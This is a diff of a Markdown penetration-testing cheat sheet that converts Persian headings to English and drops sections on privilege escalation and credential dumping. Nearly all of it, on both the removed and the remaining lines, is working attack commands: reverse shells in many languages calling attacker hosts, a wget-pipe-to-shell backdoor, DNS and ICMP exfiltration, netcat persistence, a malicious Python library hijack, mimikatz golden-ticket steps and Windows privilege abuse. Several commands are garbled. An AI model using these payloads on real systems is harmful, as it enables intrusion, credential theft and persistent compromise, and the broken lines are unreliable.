@@ -1,13 +1,12 @@
 ---
 layout: default
-published: true
 ---
 
-# نکات و ترفند ها
+# Tips and Tricks
 
-## انتقال فایل
+## File transfer
 
-### انتقال توسط ftp بدون دسترسی مستقیم به شل
+### Ftp trough non-interactive shell
 
 ```text
 echo open ip 21 ftp.txt
@@ -19,7 +18,7 @@ echo bye ftp.txt
 ftp -s:ftp.txt
 ```
 
-### انتقال Dns در لینوکس
+### Dns transfer on linux
 
 ```text
 On victim:
@@ -38,7 +37,7 @@ On attacker:
    xxd -r -p received~.txt kefS.pgp
 ```
 
-### اجرای دستور exfil و انتقال اطلاعات آن با icmp
+### Exfil command output on a linux machine over ICMP
 
 ```text
 On victim (never ending 1 liner) :
@@ -52,7 +51,7 @@ tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
 grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
 ```
 
-### باز نمودن mail relay
+### Open mail relay
 
 ```text
 C:\ telnet x.x.x.x 25
@@ -64,29 +63,28 @@ Thank You.
 quit
 ```
 
-## شل معکوس
+## Reverse shells \[1\]\[2\]\[3\]
 
-### دستور Netcat \(\* اجرا در سیستم مهاجم\)
+### Netcat \(\* start listener on attack box to catch shell\)
 
 ```text
 nc 10.0.0.1 1234 -e /bin/sh    Linux reverse shell
 nc 10.0.0.1 1234 -e cmd.exe    Windows reverse shell
 ```
 
-### دستور Netcat \(ممکن است در بعضی از نسخه ها -e پشتیبانی نشود\)
+### Netcat \(some versions don't support -e option\)
 
 ```text
 nc -e /bin/sh 10.0.0.1 1234
 ```
 
-### دستور Netcat  برای موقع هایی که -e پشتیبانی نمی شود
+### Netcat  work-around when -e option not possible
 
 ```text
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.105 9999 >/tmp/f
 ```
 
-### زبان Perl
+### Perl
 
 ```text
 perl -e 'use Socket; $i="10.0.0.l"; $p=1234; socket(S,PF INET, SOCK STREAM,
@@ -94,7 +92,7 @@ getprotobjname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){
 open(STDIN," &S") ;open(STDOUT," &S"); open(STDERR," &S"); exec("/bin/sh" -i");};'
 ```
 
-### زبان Perl بدون نیاز به /bin/sh
+### Perl without /bin/sh
 
 ```text
 perl -MIO -e '$p=fork;exit,if($p);$c=new
@@ -102,14 +100,14 @@ IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN- fdopen($c,r);$~-fdopen($
 c,w) ;system$_ while ;'
 ```
 
-### زبان Perl برای windows
+### Perl for windows
 
 ```text
 perl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN-fdopen($
 c,r) ;$~- fdopen($c,w) ;system$_ while ;'
 ```
 
-### زبان Python
+### Python
 
 ```text
 python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET,
@@ -117,59 +115,14 @@ socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);'
 ```
-یا 
 
-```text
-check sudoer script content like:
-
-#!/usr/bin/python3
-from shutil import make_archive
-src = '/var/www/html/'
-# old ftp directory, not used anymore
-#dst = '/srv/ftp/html'
-dst = '/var/backups/html'
-make_archive(dst, 'gztar', src)
-You have new mail in /var/mail/waldo
-
-and create file for got root as shutil.py contains:
-
-import os
-import pty
-import socket
-
-lhost = "10.10.10.10"
-lport = 4444
-
-ZIP_DEFLATED = 0
-
-class ZipFile:
-   def close(*args):
-       return
-   def __init__(self, *args):
-       return
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((lhost, lport))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-os.putenv("HISTFILE",'/dev/null')
-pty.spawn("/bin/bash")
-s.close()
-
-and run sudoer script with 
-
-sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
-```
-
-
-### زبان Bash
+### Bash
 
 ```text
 bash -i & /dev/tcp/10.0.0.1/8080 0 &1
 ```
 
-### زبان Java
+### Java
 
 ```text
 r = Runtime.getRuntime()
@@ -178,20 +131,20 @@ while read line; do \$line 2 &5 &5; done"] as String[])
 p.waitFor()
 ```
 
-### زبان Php
+### Php
 
 ```text
 php -r '$sock=fsockopen("10.0.0.1", 1234) ;exec("/bin/sh -i &3 &3 2 &3");'
 ```
 
-### زبان Ruby
+### Ruby
 
 ```text
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec
 sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'
 ```
 
-### زبان Ruby بدون نیاز به /bin/sh
+### Ruby without /bin/sh
 
 ```text
 by -rsocket -e 'exit if
@@ -199,7 +152,7 @@ fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, " r
 ") {| io|c.print io.read}end'
 ```
 
-### زبان Ruby برای windows
+### Ruby for windows
 
 ```text
 ruby -rsocket -e
@@ -207,7 +160,7 @@ ruby -rsocket -e
 io|c.print io.read}end'
 ```
 
-### دستور Telnet
+### Telnet
 
 ```text
 rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
@@ -215,7 +168,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
 telnet attackerip 4444 | /bin/bash | telnet attackerip 4445
 ```
 
-### دستور Xterm
+### Xterm
 
 ```text
 xterm -displaj 10.0.0.1:1
@@ -223,398 +176,22 @@ o Start Listener: Xnest :1
 o Add permission to connect: xhost +victimiP
 ```
 
-### متفرقه
+### Misc
 
 ```text
 wget hhtp:// server /backdoor.sh -O- | sh Downloads and runs backdoor.sh
 ```
 
-### spawn شل
+## Persistence
 
-```text
-python3 -c 'import pty; pty.spawn("/bin/sh")'
-```
-
-```text
-try ctrl + z
-stty raw -echo 
-fg
-```
-
-```text
-echo os.system('/bin/bash')
-```
-
-```text
-/bin/sh -i
-```
-
-
-```text
-perl —e 'exec "/bin/sh";'
-```
-
-```text
-perl: exec "/bin/sh";
-```
-
-```text
-ruby: exec "/bin/sh"
-```
-
-```text
-lua: os.execute('/bin/sh')
-```
-
-```text
-(From within IRB)
-exec "/bin/sh"
-```
-
-
-```text
-(From within vi)
-:!bash
-```
-
-```text
-(From within vi)
-:set shell=/bin/bash:shell
-```
-
-```text
-(From within nmap)
-!sh
-```
-
- [netsec.ws](http://netsec.ws/?p=337)
-
-## ارتقا دسترسی
-
-راهنما: https://gtfobins.github.io/
-
-### افزایش دسترسی با composer
-
-```text
-TF=$(mktemp -d)
-echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
-sudo composer --working-dir=$TF run-script x
-```
-
-### افزایش دسترسی با docker
-
-باید با کاربردی که عضو گروه docker است وارد شده باشید.
-
-```text
-docker run -v /root:/mnt -it ubuntu
-```
-
-یا 
-
-```text
-docker run --rm -it --privileged nginx bash
-mkdir /mnt/fsroot
-mount /dev/sda /mnt/fsroot
-```
-
-### افزایش دسترسی با docker socket
-
-
-```text
-
-بررسیexpose بودن docker
-
-curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
-
-دستورات زیر در اسکریپت می کنیم.
-
-cmd="whoami"
-payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
-response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"sandbox\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)
-
-revShellContainerID=$(echo "$response" | cut -d'"' -f4)
-
-curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start
-sleep 1
-curl --output - -s --unix-socket /var/run/docker.sock "http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1"
-
-سپس آن را اجرا می کنیم.
-
-./docket-socket-expose.sh
-```
-
-
-### افزایش دسترسی با lxd
-
-```text
-in attacker host
-1. git clone https://github.com/saghul/lxd-alpine-builder.git
-2. ./build-alpine
-in victim host
-3. download builded image 
-4. import ./alpine-v3.12-x86_64-20200621_2005.tar.gz --alias attacker
-5. lxc init attacker tester -c security.privileged=true
-6. lxc exec tester/bin/sh
-```
-
-### افزایش دسترسی در journalctl 
-
-اجرا کننده journalctl باید با دسترسی بیشتری مانند sudo اجرا شده باشد.
-
-```text
-journalctl
-!/bin/sh
-```
-
-یا
-
-```text
-sudo journalctl
-!/bin/sh
-```
-
-### ارتقا دسترسی با Splunk Universal Forward Hijacking
-
-```text
-python PySplunkWhisperer2_remote.py --lhost 10.10.10.5 --host 10.10.15.20 --username admin --password admin --payload '/bin/bash -c "rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp/luci11|/bin/sh -i 2>&1|nc 10.10.10.5 5555 >/tmp/luci11"'
-
-```
-
-### افزایش دسترسی با فایل 00-header
-
-```text
-echo “id” >> 00-header
-```
-
-### افزایش دسترسی در nano
-
-```text
-Ctrl+R + Ctrl+X
-reset; sh 1>&0 2>&0
-```
-
-یا
-
-```text
-Ctrl+W
-/etc/shadow
-```
-
-### افزایش دسترسی در vi
-
-```text
-:!/bin/sh
-```
-
-### افزایش دسترسی با استفاده از acl
-
-```text
-$user = "megacorp\jorden"
-$folder = "C:\Users\administrator"
-$acl = get-acl $folder
-$aclpermissions = $user, "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow"
-$aclrule = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermissions 
-$acl.AddAccessRule($aclrule)
-set-acl -path $folder -AclObject $acl
-get-acl $folder | folder
-```
-
-### افزایش دسترسی با ldap
-
-```text
-
-برای فعال سازی ssh با استفاده از ldap
-
-0. exec ldapmodify -x -w PASSWORD
-1. paste this
-dn: cn=openssh-lpk,cn=schema,cn=config
-objectClass: olcSchemaConfig
-cn: openssh-lpk
-olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME 'sshPublicKey' 
-  DESC 'MANDATORY: OpenSSH Public key'
-  EQUALITY octetStringMatch
-  SYNTAX 1.3.6.1.4.1.1466.115.121.1.40 )
-olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME 'ldapPublicKey' SUP top AUXILIARY
-  DESC 'MANDATORY: OpenSSH LPK objectclass'
-  MAY ( sshPublicKey $ uid ) 
-  )
-
-برای ارتقا دسترسی به کاربر و گروه کاربری مورد نظر
-
-2. exec ldapmodify -x -w PASSWORD
-3. paste this
-dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC
-changeType: modify
-add: objectClass
-objectClass: ldapPublicKey
--
-add: sshPublicKey
-sshPublicKey: content of id_rsa.pub
--
-replace: EVIL GROUP ID
-uidNumber: CURRENT USER ID
--
-replace: EVIL USER ID
-gidNumber: CURRENT GROUP ID
-```
-
-### کپی از ndts با استفاده از مجوز SeBackupPrivilege 
-
-```text
-import-module .\SeBackupPrivilegeUtils.dll
-import-module .\SeBackupPrivilegeCmdLets.dll
-Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
-```
-
-### ارتقا دسترسی با مجوز SeImpersonatePrivilege
-
-```text
-https://github.com/dievus/printspoofer
-printspoofer.exe -i -c "powershell -c whoami"
-```
-
-### خواندن فایل ها بدون احراز هویت با diskshadow
-
-```text
-1. priv.txt contain
-SET CONTEXT PERSISTENT NOWRITERSp
-add volume c: alias 0xprashantp
-createp
-expose %0xprashant% z:p
-2. exec with diskshadow /s priv.txt
-```
-
-### ارتقا دسترسی با مجوز SeLoadDriverPrivilege
-
-```text
-
-FIRST:
-Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
-Download https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp
-Download https://github.com/tandasat/ExploitCapcom
-change ExploitCapcom.cpp line 292 
-TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
-to
-TCHAR CommandLine[] = TEXT("C:\\test\\shell.exe");
-then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe
-
-SECOND:
-1. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
-2. .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
-3. .\ExploitCapcom.exe
-4. in msf exec `run`
-```
-
-### ارتقا دسترسی با سرویس vds.exe
-
-```text
-. .\PowerUp.ps1
-Invoke-ServiceAbuse -Name ‘vds’ -UserName ‘domain\user1’
-```
-
-### ارتقا دسترسی با ForceChangePassword
-
-```text
-https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
-Import-Module .\PowerView_dev.ps1
-Set-DomainUserPassword -Identity user1 -verbose
-Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
-```
-
-### ارتقا دسترسی با سرویس browser
-
-```text
-. .\PowerUp.ps1
-Invoke-ServiceAbuse -Name ‘browser’ -UserName ‘domain\user1’
-```
-
-### ارتقا دسترسی با دسترسی GenericWrite
-
-```text
-$pass = ConvertTo-SecureString 'Password123#' -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\MASTER USER'), $pass)
-Set-DomainObject -Credential $creds USER1 -Clear serviceprincipalname
-Set-DomainObject -Credential $creds -Identity USER1 -SET @{serviceprincipalname='none/fluu'}
-.\Rubeus.exe kerberoast /domain:<DOMAIN>
-```
-
-### ارتقا دسترسی با استفاده از سرویس Sql و ActiveSessions
-
-```text
-https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1
-. .\Heidi.ps1
-Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” -Instance COMPUTERNAME
-```
-
-### دریافت golden ticket با استفاده از mimikatz و scheduled task
-
-```text
-1.mimikatz# token::elevate
-2.mimikatz# vault::cred /patch
-3.mimikatz# lsadump::lsa /patch
-4.mimikatz# kerberos::golden /user:Administrator /rc4:<Administrator NTLM(step 3)> /domain:<DOMAIN> /sid:<USER SID> /sids:<Administrator SIDS> /ticket:<OUTPUT TICKET PATH>
-5.powercat -l -v -p 443
-6.schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" /TN "enterprise" /TR "powershell.exe-c 'iex (iwr http://10.10.10.10/reverse.ps1)'”
-7.schtasks /run /s DOMAIN /TN "enterprise”
-```
-
-### ارتقا دسترسی با استفاده از روش Pass-the-Ticket
-
-```text
-1..\Rubeus.exe asktgt /user:<USET>$ /rc4:<NTLM HASH> /ptt
-2.klist
-```
-
-### ارتقا دسترسی با GPO آسیب پذیر
-
-```text
-1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
-```
-
-### تولید Golden Ticket با mimikatz
-
-```text
-1.mimikatz # lsadump::dcsync /user:<USER>
-2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT SECURITY ID> /rce:<NTLM HASH> /id:<USER ID>
-```
-
-### ارتقا دسترسی با پایگاه داده TRUSTWORTHY در SQL Server
-
-```text
-1. . .\PowerUpSQL.ps1
-2. Get-SQLInstanceLocal -Verbose
-3. (Get-SQLServerLinkCrawl -Verbos -Instance "10.10.10.10" -Query 'select * from master..sysservers').customer.query
-4. 
-USE "master";
-SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
-execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>"
-5. powershell -ep bypass
-6. Import-Module .\powercat.ps1
-7. powercat -l -v -p 443 -t 10000
-8.
-SELECT *, SCHEMA_NAME("schema_id") AS 'schema' FROM "master"."sys"."objects" WHERE "type" IN ('P', 'U', 'V', 'TR', 'FN', 'TF, 'IF');
-execute('sp_configure "xp_cmdshell",1;RECONFIGURE') at "<DOMAIN>\<DATABASE NAME>" 
-execute('exec master..xp_cmdshell "\\10.10.10.10\reverse.exe"') at "<DOMAIN>\<DATABASE NAME>" 
-```
-
-### ارتقا دسترسی با gdbus
-
-```text
-gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
-```
-
-
-
-## دسترسی همیشگی
-
-### برای لینوکس \(در سیستم مهاجم\)
+### For linux persistence \(on attack box\)
 
 ```text
 crontab -e : set for every 10 min
 0-59/10  nc ip 777 -e /bin/bash
 ```
 
-### برای ویندوز \(شروع task scheduler\)
+### Windows  task scheduler persistence \(start task scheduler\)
 
 ```text
 sc config schedule start= auto
@@ -622,7 +199,7 @@ net start schedule
 at 13:30 ""C:\nc.exe ip 777 -e cmd.exe""
 ```
 
-### اجرای backdoor به همراه بایپس فایروال ویندوز
+### Windows persistence backdoor with firewall bypass
 
 ```text
 1. REG add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\Run
@@ -632,7 +209,7 @@ at 13:30 ""C:\nc.exe ip 777 -e cmd.exe""
    "%USERPROFILE%\backdoor.exe" /ED 12/12/2012
 ```
 
-### توسعه پیلود در smb یا webdav
+### Remote Payload development via smb or webdav
 
 ```text
 Via SMB:
@@ -656,29 +233,15 @@ wmic /node: remote ip /user:domain\compromised user //password:password
 process call create "\ \ payload ip \test\msf.exe"
 ```
 
-## دریافت پروسس lsass و استخراج اطلاعات با mimikatz
+## Tunneling 
 
-```text
-procdump.exe -accepteula -64 -ma lsass.exe  lsass.dmp
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonPasswords f
-```
-
-## استخراج اطلاعات در حافظه با استفاده از افزونه mimikatz در volatility
-
-```text
-volatility — plugins=/usr/share/volatility/plugins — profile=Win7SP0x86 -f halomar.dmp mimikatz
-````
-
-## تونل 
-
-### Fpipe - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2
+### Fpipe - listen on 1234 and forward to port 80 on 2.2.2.2
 
 ```text
 fpipe.exe -l 1234 -r 80 2.2.2.2
 ```
 
-### Socks.exe - پویش اینترانت در پروکسی ساکس
+### Socks.exe - scan intranet trough socks proxy
 
 ```text
 On redirector (1.1.1.1):
@@ -693,19 +256,13 @@ Scan through socks proxy:
     proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
 ```
 
-### Socat - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2
+### Socat - listen on 1234 and forward to port 80 on 2.2.2.2
 
 ```text
 socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
 ```
 
-### ایجاد ssh بدون سرویس ssh
-
-```text
-./socat TCP-LISTEN:22,fork,reuseaddr TCP:172.10.10.11:22
-```
-
-### Stunnel - ssl encapsulated در تونل nc \(ویندوز & لینوکس\) \[8\]
+### Stunnel - ssl encapsulated nc tunnel \(windows & linux\) \[8\]
 
 ```text
 On attacker (client):
@@ -727,23 +284,23 @@ On attacker (client):
 # nc -nv 127.0.0.1 5555
 ```
 
-## نکات جست و جو در google
+Google hacking
 
-| **پارامتر** | **توضیح** |
+| **Search Term** | **Description** |
 | :--- | :--- |
-| site: \[url\] | جست و جو یک سایت \[url\] |
-| numrange: \[\#\]...\[\#\] | جست و جو در محدوده عددی |
-| date: \[ \#\] | جست و جو در یک ماه گذشته |
-| link: \[url\] | جست و جو صفحاتی که دارای آدرس خاصی است |
-| related: \[url\] | جست و جو صفحات مرتبط با آدرس خاص |
-| intitle: \[string\] | جست و جو صفحاتی که دارای عنوان خاصی است |
-| inurl: \[string\] | جست و جو صفحاتی که در url آن دارای آدرس خاصی است|
-| filetjpe: \[xls\] | جست و جو کلیه فایل های با پسوند xls |
-| phonebook: \[name\] | جست و جو کلیه دفترچه تلفن هایی که دارای نام خاص می باشند |
+| site: \[url\] | search ony one \[url\] |
+| numrange: \[\#\]...\[\#\] | search within a number range |
+| date: \[ \#\] | search within past \[\#\] months |
+| link: \[url\] | find pages that link to \[url\] |
+| related: \[url\] | find pages related to \[url\] |
+| intitle: \[string\] | find pages with \[string\] in title |
+| inurl: \[string\] | find pages with \[string\] in url |
+| filetjpe: \[xls\] | find files that are xls |
+| phonebook: \[name\] | find phone book listings of \[name\] |
 
-## نکات Video teleconferencing
+## Video teleconferencing
 
-### برند Polycom
+### Polycom
 
 ```text
 telnet ip
@@ -754,21 +311,15 @@ http:// ip /a_security.htm
 http:// ip /a_rc.htm
 ```
 
-### برند Trandberg
+### Trandberg
 
 ```text
 http:// ip /snapctrl.ssi
 ```
 
-### برند Sony webcam
+### Sony webcam
 
 ```text
 http:// ip /commard/visca-gen.cgi?visca= str
 8101046202FF : Freeze Camera
-```
-
-## با perl تبدیل باینری به اسکی
-
-```text
-cat blue | perl -lpe '$_=pack"B*",$_' > bin
 ```
